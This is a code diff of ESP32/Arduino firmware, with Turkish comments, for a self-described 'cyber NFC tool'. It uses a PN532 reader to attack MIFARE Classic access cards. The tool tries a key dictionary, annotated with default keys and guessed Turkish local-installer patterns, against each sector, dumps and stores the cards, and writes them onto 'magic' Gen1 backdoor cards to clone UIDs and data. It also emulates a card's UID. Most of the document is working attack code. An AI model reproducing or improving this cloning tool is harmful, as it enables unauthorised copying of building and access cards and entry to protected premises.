@@ -24,13 +24,15 @@ struct CardProfile {
 CardProfile activeCard;
 
 // --- GENİŞLETİLMİŞ SÖZLÜK (GLOBAL) ---
-const int TOTAL_KEYS = 55; 
+const int TOTAL_KEYS = 50; 
+// PROGMEM kullanarak RAM tasarrufu yapıyoruz (Büyük listeler için)
 const byte keys[TOTAL_KEYS][6] = {
-  // --- KÜRESEL STANDARTLAR (Öncelikli) ---
-  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 
-  {0x00,0x00,0x00,0x00,0x00,0x00}, 
-  {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, 
-  {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}, 
+  // --- KÜRESEL STANDARTLAR ---
+  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, // Fabrika (En Yaygın)
+  {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, // NXP MAD
+  {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}, // NFC Forum
+  {0x00,0x00,0x00,0x00,0x00,0x00}, // Boş
+  {0xA1,0xA2,0xA3,0xA4,0xA5,0xA6},
   {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},
   {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
   {0x1A,0x98,0x2C,0x7E,0x45,0x9A},
@@ -40,12 +42,6 @@ const byte keys[TOTAL_KEYS][6] = {
   {0xA0,0x47,0x8C,0xC3,0x90,0x91},
   {0xA0,0xB0,0xC0,0xD0,0xE0,0xF0},
   {0xA1,0xB1,0xC1,0xD1,0xE1,0xF1},
-  // --- YENİ EKLENENLER ---
-  {0xFF,0xFF,0xFF,0xFF,0xFF,0x00}, 
-  {0x00,0x00,0x00,0x00,0x00,0xFF}, 
-  {0xAB,0xCD,0xEF,0x12,0x34,0x56},
-  {0x12,0x34,0x56,0xAB,0xCD,0xEF},
-  // --- DİĞERLERİ ---
   {0x12,0x34,0x56,0x78,0x9A,0xBC},
   {0x01,0x02,0x03,0x04,0x05,0x06},
   {0x10,0x20,0x30,0x40,0x50,0x60},
@@ -55,6 +51,8 @@ const byte keys[TOTAL_KEYS][6] = {
   {0x0F,0x0F,0x0F,0x0F,0x0F,0x0F},
   {0x53,0x3C,0xB6,0xC7,0x23,0xF6},
   {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},
+  
+  // --- BASİT DESENLER (Çin Malı Sistemler) ---
   {0x11,0x11,0x11,0x11,0x11,0x11},
   {0x22,0x22,0x22,0x22,0x22,0x22},
   {0x33,0x33,0x33,0x33,0x33,0x33},
@@ -64,27 +62,29 @@ const byte keys[TOTAL_KEYS][6] = {
   {0x77,0x77,0x77,0x77,0x77,0x77},
   {0x88,0x88,0x88,0x88,0x88,0x88},
   {0x99,0x99,0x99,0x99,0x99,0x99},
-  {0x14,0x53,0x14,0x53,0x14,0x53},
-  {0x19,0x23,0x19,0x23,0x19,0x23},
-  {0x34,0x34,0x34,0x34,0x34,0x34},
-  {0x06,0x06,0x06,0x06,0x06,0x06},
-  {0x35,0x35,0x35,0x35,0x35,0x35},
-  {0x01,0x01,0x01,0x01,0x01,0x01},
-  {0x63,0x63,0x63,0x63,0x63,0x63},
-  {0x12,0x34,0x56,0x12,0x34,0x56},
-  {0x12,0x31,0x23,0x12,0x31,0x23},
-  {0x20,0x23,0x20,0x23,0x20,0x23},
-  {0x20,0x24,0x20,0x24,0x20,0x24},
-  {0x20,0x25,0x20,0x25,0x20,0x25},
-  {0x11,0x22,0x33,0x44,0x55,0x66},
-  {0xAA,0xAA,0xAA,0xBB,0xBB,0xBB},
-  {0xAD,0xAD,0xAD,0xAD,0xAD,0xAD},
-  {0x12,0x34,0x56,0x65,0x43,0x21},
-  {0x00,0x00,0x00,0xFF,0xFF,0xFF}
+
+  // --- TÜRKİYE ÖZEL / YEREL MONTAJCI DESENLERİ ---
+  {0x14,0x53,0x14,0x53,0x14,0x53}, // Fetih 1453 (Çok yaygın)
+  {0x19,0x23,0x19,0x23,0x19,0x23}, // Cumhuriyet
+  {0x34,0x34,0x34,0x34,0x34,0x34}, // Istanbul Plaka
+  {0x06,0x06,0x06,0x06,0x06,0x06}, // Ankara Plaka
+  {0x35,0x35,0x35,0x35,0x35,0x35}, // Izmir Plaka
+  {0x01,0x01,0x01,0x01,0x01,0x01}, // Adana/Genel
+  {0x63,0x63,0x63,0x63,0x63,0x63}, // Şanlıurfa (Kart Sistemlerinde Yaygın)
+  {0x12,0x34,0x56,0x12,0x34,0x56}, // Tekrar Eden Sıralı
+  {0x12,0x31,0x23,0x12,0x31,0x23}, // Klavye Deseni
+  {0x20,0x23,0x20,0x23,0x20,0x23}, // Yıl Bazlı 1
+  {0x20,0x24,0x20,0x24,0x20,0x24}, // Yıl Bazlı 2
+  {0x20,0x25,0x20,0x25,0x20,0x25}, // Yıl Bazlı 3
+  {0x11,0x22,0x33,0x44,0x55,0x66}, // Çiftli Sıra
+  {0xAA,0xAA,0xAA,0xBB,0xBB,0xBB}, // Harf Tekrarı
+  {0xAD,0xAD,0xAD,0xAD,0xAD,0xAD}, // Admin Kısaltması
+  {0x12,0x34,0x56,0x65,0x43,0x21}, // Gidiş Dönüş
+  {0x00,0x00,0x00,0xFF,0xFF,0xFF}  // Yarım Dolu
 };
 
 // Fonksiyonlar
-void smartAnalyzeAndSave();    // [R]
+void smartAnalyzeAndSave();    // [R] - YENİ ALGORİTMA
 int findCardInDB(byte* uid, byte len);
 void displayDataWithASCII(int sector, int block, byte* data);
 bool tryKey(byte* uid, byte len, int sector, const byte* key); 
@@ -94,13 +94,12 @@ void deleteCard(int index);
 void listCards();
 void loadCardFromDisk(int index);
 bool unlockBackdoor();
-void reselectCard(byte* expectedUID, byte len); 
 
 void setup() {
-  Serial.begin(9600);
+  Serial.begin(9600); // İSTEK ÜZERİNE 9600 BAUD
   delay(1000);
-  Serial.println("\n--- TURKISH CYBER NFC TOOL V6.4 ---");
-  Serial.println("Fix: Detailed Progress Output");
+  Serial.println("\n--- TURKISH CYBER NFC TOOL V4 ---");
+  Serial.println("Algoritma: Sector 0 First + Same Key Strategy");
   Serial.println("[R] Akilli Oku | [W] Klonla | [E] Taklit | [D] Sil | [L] Liste");
 
   if (!SPIFFS.begin(true)) Serial.println("SPIFFS Hatasi!");
@@ -127,12 +126,6 @@ void loop() {
   }
 }
 
-void reselectCard(byte* expectedUID, byte len) {
-  byte uid[7]; byte l;
-  nfc.inListPassiveTarget(); // Reset ve bekleme
-  nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &l, 50);
-}
-
 // --- [R] AKILLI ANALİZ ALGORİTMASI ---
 void smartAnalyzeAndSave() {
   Serial.println("\n=== [R] AKILLI KIRMA MODU (TR) ===");
@@ -145,109 +138,165 @@ void smartAnalyzeAndSave() {
   for(int i=0; i<len; i++) { Serial.print(uid[i], HEX); Serial.print(" "); }
   Serial.println();
 
+  // 1. ÇİFT KAYIT KONTROLÜ
+  int existingID = findCardInDB(uid, len);
+  if (existingID != -1) {
+    Serial.println("\n>>> BU KART ZATEN ID [" + String(existingID) + "]'DE KAYITLI! <<<");
+    return;
+  }
+
   // HAZIRLIK
   memset(&activeCard, 0, sizeof(CardProfile));
   memcpy(activeCard.uid, uid, len);
   activeCard.uidLen = len;
 
-  Serial.println("--- ANALIZ BASLIYOR (Re-Select Aktif) ---");
-  byte goldenKey[6] = {0}; 
+  Serial.println("----------------------------------------------------------------");
+  Serial.println("STRATEJI: Once Sektor 0 kirilacak, sonra ayni sifre denenecek.");
+  Serial.println("----------------------------------------------------------------");
+
+  byte goldenKey[6] = {0}; // Eğer Sektor 0 çözülürse buraya kaydedeceğiz
   bool hasGoldenKey = false;
 
-  // --- ADIM 1: SEKTÖR 0 ---
-  Serial.print("Sektor 0 Kiriliyor... ");
+  // --- ADIM 1: SEKTÖR 0'I KIRMA (Tüm Anahtarlarla) ---
+  Serial.print("Analiz: Sektor 0 araniyor... ");
+  
   for (int k = 0; k < TOTAL_KEYS; k++) {
-    if (k > 0) reselectCard(uid, len);
     if (tryKey(uid, len, 0, keys[k])) {
-      Serial.println("[ BASARILI ]");
+      Serial.println("[ BULUNDU ]");
       memcpy(goldenKey, keys[k], 6);
       memcpy(activeCard.sectorKeys[0], keys[k], 6);
       activeCard.sectorSolved[0] = true;
       hasGoldenKey = true;
-      for (int b=0; b<4; b++) nfc.mifareclassic_ReadDataBlock(b, &activeCard.data[b*16]);
-      break; 
+      
+      // Sektör 0 verisini hemen oku
+      for (int b=0; b<4; b++) {
+         nfc.mifareclassic_ReadDataBlock(b, &activeCard.data[b*16]);
+      }
+      break; // Bulduk, döngüden çık
     }
   }
 
-  if (!hasGoldenKey) Serial.println("[ BASARISIZ ]");
+  if (!hasGoldenKey) {
+    Serial.println("[ BULUNAMADI ] -> Standart taramaya geciliyor.");
+  } else {
+    Serial.print("Golden Key: ");
+    for(int i=0; i<6; i++) { Serial.print(goldenKey[i], HEX); }
+    Serial.println(" -> Tum sektorlerde deneniyor...");
+  }
 
-  // --- ADIM 2: DİĞER SEKTÖRLER ---
-  Serial.println("\nDiger sektorler taraniyor (Detayli Mod)...");
-  
-  for (int s = 1; s < 16; s++) {
-    Serial.print("Sektor "); Serial.print(s); Serial.print(": ");
+  // --- ADIM 2: DİĞER SEKTÖRLERİ TARAMA ---
+  for (int s = 1; s < 16; s++) { // Sektör 1'den başla
     bool cracked = false;
-    
-    // Strateji A: Golden Key
+
+    // STRATEJİ A: Önce Golden Key dene (Varsa)
     if (hasGoldenKey) {
-      reselectCard(uid, len);
       if (tryKey(uid, len, s, goldenKey)) {
         memcpy(activeCard.sectorKeys[s], goldenKey, 6);
         activeCard.sectorSolved[s] = true;
         cracked = true;
+        // Hız kazandık! Sözlüğü taramaya gerek kalmadı.
       }
     }
 
-    // Strateji B: Sözlük (VERBOSE MOD)
+    // STRATEJİ B: Eğer Golden Key yoksa veya tutmadıysa -> Full Sözlük Tara
     if (!cracked) {
-      Serial.print("[Deneme: ");
       for (int k = 0; k < TOTAL_KEYS; k++) {
-        // Canlı Gösterge: Her denemede sayıyı bas
-        Serial.print(k); Serial.print("..");
-        
-        // İşlemcinin nefes alması için
-        yield(); 
-
-        reselectCard(uid, len);
         if (tryKey(uid, len, s, keys[k])) {
           memcpy(activeCard.sectorKeys[s], keys[k], 6);
           activeCard.sectorSolved[s] = true;
           cracked = true;
-          Serial.print(" BULUNDU!]");
           break; 
         }
-        
-        // Okunabilirlik için satır atla
-        if (k > 0 && k % 10 == 9) Serial.print("\n          ");
       }
-      if (!cracked) Serial.print(" YOK]");
     }
-    
+
+    // SONUÇLARI İŞLE
     if (cracked) {
-      Serial.println(" -> OK");
-      reselectCard(uid, len);
-      tryKey(uid, len, s, activeCard.sectorKeys[s]);
+      // Veriyi Oku ve Ekrana Bas
       for (int b = 0; b < 4; b++) {
         int blk = (s*4)+b;
         nfc.mifareclassic_ReadDataBlock(blk, &activeCard.data[blk*16]);
+        displayDataWithASCII(s, blk, &activeCard.data[blk*16]);
       }
     } else {
-      Serial.println(" -> FAIL");
+      Serial.print("  "); Serial.print(s); 
+      Serial.println("  | ??? | -- KILITLI (Sifre bulunamadi) --    | ?????");
     }
   }
 
   // KAYDETME
   int newID = 0;
   while(SPIFFS.exists("/card_"+String(newID)+".bin")) newID++;
+  
   File f = SPIFFS.open("/card_" + String(newID) + ".bin", "w");
   f.write((byte*)&activeCard, sizeof(CardProfile));
   f.close();
-  Serial.print("\n>>> KAYIT TAMAMLANDI. ID: "); Serial.println(newID);
+
+  Serial.println("----------------------------------------------------------------");
+  Serial.print(">>> KAYIT BASARILI! Yeni ID: [ "); Serial.print(newID); Serial.println(" ] <<<");
 }
 
 // --- YARDIMCI FONKSİYONLAR ---
 bool tryKey(byte* uid, byte len, int sector, const byte* key) {
-  if(nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 0, (uint8_t*)key)) return true;
-  reselectCard(uid, len); 
-  if(nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 1, (uint8_t*)key)) return true;
-  return false;
+  // Const byte* kullandık çünkü array'den geliyor
+  return nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 0, (uint8_t*)key);
 }
 
-void displayDataWithASCII(int sector, int block, byte* data) {}
+void displayDataWithASCII(int sector, int block, byte* data) {
+  if(sector < 10) Serial.print("  "); else Serial.print(" ");
+  Serial.print(sector); Serial.print(" | ");
+  if(block < 10) Serial.print(" ");
+  Serial.print(block); Serial.print("  | ");
 
-int findCardInDB(byte* uid, byte len) { return -1; }
+  for(int i=0; i<16; i++) {
+    if(data[i] < 0x10) Serial.print("0");
+    Serial.print(data[i], HEX); Serial.print(" ");
+  }
+  Serial.print("| ");
 
-void deleteCard(int index) { SPIFFS.remove("/card_"+String(index)+".bin"); Serial.println("Silindi."); }
+  for(int i=0; i<16; i++) {
+    char c = data[i];
+    if (c >= 32 && c <= 126) Serial.print(c);
+    else Serial.print(".");
+  }
+  Serial.println();
+}
+
+int findCardInDB(byte* uid, byte len) {
+  int id = 0;
+  while(1) {
+    String fname = "/card_" + String(id) + ".bin";
+    if(!SPIFFS.exists(fname)) break;
+    File f = SPIFFS.open(fname, "r");
+    if(f) {
+      CardProfile temp;
+      f.read((byte*)&temp, sizeof(CardProfile));
+      f.close();
+      
+      // İçerik Kontrolü (Random UID için)
+      bool match = true;
+      bool isZero = true; 
+      for(int i=0; i<16; i++) if(activeCard.data[64+i] != 0) isZero = false; // Block 4 kontrol
+      
+      if(!isZero) {
+        if(memcmp(&temp.data[64], &activeCard.data[64], 16) != 0) match = false;
+      } else {
+        // Kart boşsa veya okunamadıysa sadece UID bak
+        if(temp.uidLen != len || memcmp(temp.uid, uid, len) != 0) match = false;
+      }
+      
+      if(match) return id;
+    }
+    id++;
+  }
+  return -1;
+}
+
+// --- DİĞER STANDART FONKSİYONLAR (Kopyalama/Silme vs.) ---
+void deleteCard(int index) {
+  if(SPIFFS.remove("/card_"+String(index)+".bin")) Serial.println("Silindi.");
+  else Serial.println("Hata.");
+}
 
 void listCards() {
   Serial.println("\n--- VERITABANI ---");
@@ -266,143 +315,41 @@ void loadCardFromDisk(int index) {
   File f = SPIFFS.open(n, "r");
   f.read((byte*)&activeCard, sizeof(CardProfile));
   f.close();
-  Serial.println("Yuklendi. Klonlanacak UID: ");
-  for(int i=0; i<activeCard.uidLen; i++) { Serial.print(activeCard.uid[i], HEX); Serial.print(" "); }
-  Serial.println();
+  Serial.println("Yuklendi.");
 }
 
-// --- [W] DOĞRULAMALI YAZMA FONKSİYONU ---
 void verifyAndWrite() {
-  Serial.println("\n=== [W] KLONLAMA (DOGRULAMALI) ===");
-  Serial.println("Lutfen HEDEF (Bos) karti koyun...");
-  
-  byte targetUID[7]; byte targetLen;
-  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, targetUID, &targetLen, 500)) { delay(50); }
-
-  Serial.print("Hedef Kart UID: ");
-  for(int i=0; i<targetLen; i++) { Serial.print(targetUID[i], HEX); Serial.print(" "); }
-  Serial.println();
-
-  // Şifre Çözme
-  Serial.println("Analiz: Sifre cozuluyor...");
-  uint8_t targetKey[6];
-  bool unlocked = false;
-  int unlockedKeyType = 0; 
-  bool isGen1 = false;
-
-  for (int k = 0; k < TOTAL_KEYS; k++) {
-    if (k > 0) reselectCard(targetUID, targetLen);
-
-    if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 0, (uint8_t*)keys[k])) {
-      Serial.println(" -> Kilit Acildi (Key A).");
-      memcpy(targetKey, keys[k], 6); unlocked = true; unlockedKeyType = 0; break;
-    }
-    reselectCard(targetUID, targetLen); 
-    if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 1, (uint8_t*)keys[k])) {
-      Serial.println(" -> Kilit Acildi (Key B).");
-      memcpy(targetKey, keys[k], 6); unlocked = true; unlockedKeyType = 1; break;
+  Serial.println("Bos karti koyun...");
+  byte uid[7]; byte len;
+  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) {}
+  unlockBackdoor();
+  uint8_t k[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  if(nfc.mifareclassic_AuthenticateBlock(uid,len,0,0,k)) nfc.mifareclassic_WriteDataBlock(0, &activeCard.data[0]);
+  nfc.inListPassiveTarget(); nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 100);
+  for(int s=1; s<16; s++) {
+    if(!activeCard.sectorSolved[s]) continue;
+    if(nfc.mifareclassic_AuthenticateBlock(uid,len,s*4,0,k)) {
+      for(int b=0; b<3; b++) nfc.mifareclassic_WriteDataBlock((s*4)+b, &activeCard.data[(s*4+b)*16]);
     }
   }
-
-  if (!unlocked) {
-    reselectCard(targetUID, targetLen);
-    if (unlockBackdoor()) { Serial.println(" -> BACKDOOR (Gen 1) Acildi."); unlocked = true; isGen1 = true; }
-  }
-
-  if (!unlocked) { Serial.println("HATA: Hedef kart acilmadi."); return; }
-
-  // --- BLOK 0 HAZIRLAMA (BCC HESAPLAMALI) ---
-  byte block0Buffer[16] = {0};
-  
-  // 1. Hedef kartın mevcut Blok 0 verisini oku (Üretici verilerini korumak için)
-  if (!isGen1) {
-    reselectCard(targetUID, targetLen);
-    nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, unlockedKeyType, targetKey);
-    nfc.mifareclassic_ReadDataBlock(0, block0Buffer);
-  }
-
-  // 2. UID'yi yeni UID ile değiştir
-  memcpy(block0Buffer, activeCard.uid, 4); // Sadece 4 byte UID (Mifare Classic 1K için)
-
-  // 3. BCC (Block Check Character) Hesapla: UID0 ^ UID1 ^ UID2 ^ UID3
-  // Eğer BCC yanlış hesaplanırsa kart yazmayı reddeder!
-  byte bcc = 0;
-  for(int i=0; i<4; i++) bcc ^= activeCard.uid[i];
-  block0Buffer[4] = bcc;
-  
-  // 4. SAK ve ATQA'yı (byte 5 ve 6) koru veya standart Mifare Classic (08 04) yap
-  // Genelde mevcut veriyi korumak en iyisidir. 
-
-  Serial.println("Yazilacak Blok 0 (UID + BCC): ");
-  for(int i=0; i<16; i++) { Serial.print(block0Buffer[i], HEX); Serial.print(" "); }
-  Serial.println();
-
-  // --- YAZMA İŞLEMİ ---
-  Serial.println("Yazma Komutu Gonderiliyor...");
-  bool cmdSent = false;
-
-  if (isGen1) {
-    if (nfc.mifareclassic_WriteDataBlock(0, block0Buffer)) cmdSent = true;
-  } else {
-    reselectCard(targetUID, targetLen);
-    if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, unlockedKeyType, targetKey)) {
-      if (nfc.mifareclassic_WriteDataBlock(0, block0Buffer)) cmdSent = true;
-    }
-  }
-
-  if (!cmdSent) {
-    Serial.println("HATA: Yazma komutu kabul edilmedi.");
-    return;
-  }
-
-  // --- KRİTİK ADIM: GERÇEK DOĞRULAMA (READ-BACK) ---
-  Serial.println("Dogrulaniyor (Fiziksel Okuma)...");
-  
-  // Kartı tamamen resetle (Yazılan UID'nin aktif olması için)
-  // PN532'yi RF alanını kapatıp açmaya zorluyoruz
-  nfc.SAMConfig(); 
-  delay(100);
-  
-  byte verifyUID[7]; byte verifyLen;
-  bool readSuccess = false;
-  
-  // 3 Kere dene (Yeni UID ile okumayı)
-  for(int i=0; i<3; i++) {
-     if(nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, verifyUID, &verifyLen, 200)) {
-       readSuccess = true;
-       break;
-     }
-     delay(50);
-  }
-
-  if (!readSuccess) {
-    Serial.println("HATA: Kart yazildiktan sonra okunamadi (Brick olmus olabilir veya uzaklastirildi).");
-    return;
-  }
-
-  Serial.print("Okunan Yeni UID: ");
-  for(int i=0; i<verifyLen; i++) { Serial.print(verifyUID[i], HEX); Serial.print(" "); }
-  Serial.println();
-
-  // KARŞILAŞTIRMA
-  if (memcmp(verifyUID, activeCard.uid, 4) == 0) {
-    Serial.println("\n>>> TEBRIKLER! FIZIKSEL YAZMA BASARILI. <<<");
-    Serial.println("Kartiniz klonlandi.");
-  } else {
-    Serial.println("\n>>> BAŞARISIZ! <<<");
-    Serial.println("Komut gitti ama kart UID'yi degistirmedi.");
-    Serial.println("Olası Sebepler:");
-    Serial.println("1. BCC (Checksum) hatasi (Kodda duzeltildi).");
-    Serial.println("2. Kart 'CUID' degil, standart Mifare (UID degismez).");
-    Serial.println("3. Kart 'FUID' (Sadece 1 kere yazilabilir) ve kilitlenmis.");
-  }
-
-  // Diğer sektörleri yaz (Opsiyonel, UID başarısızsa gerek yok)
+  Serial.println("Yazma Tamam.");
 }
 
 void emulateActiveCard() {
-  Serial.println("Emulasyon...");
-  // ... (Değişmedi)
+  Serial.println("Emulasyon Baslatildi...");
+  byte cmd[] = {0x00, 0x04, 0x00, activeCard.uid[0], activeCard.uid[1], activeCard.uid[2], 0x20};
+  nfc.setPassiveActivationRetries(0xFF);
+  while(1) {
+    if(nfc.tgInitAsTarget(cmd, sizeof(cmd)) == 1) {
+      uint8_t b[255]; uint8_t l=sizeof(b);
+      if(nfc.tgGetData(b, l) > 0) {
+        Serial.println(">> TELEFON BAGLANDI! <<");
+        uint8_t r[]={0x00}; nfc.tgSetData(r,1);
+        delay(100);
+      }
+    }
+    delay(20);
+  }
 }
 
 bool unlockBackdoor() {
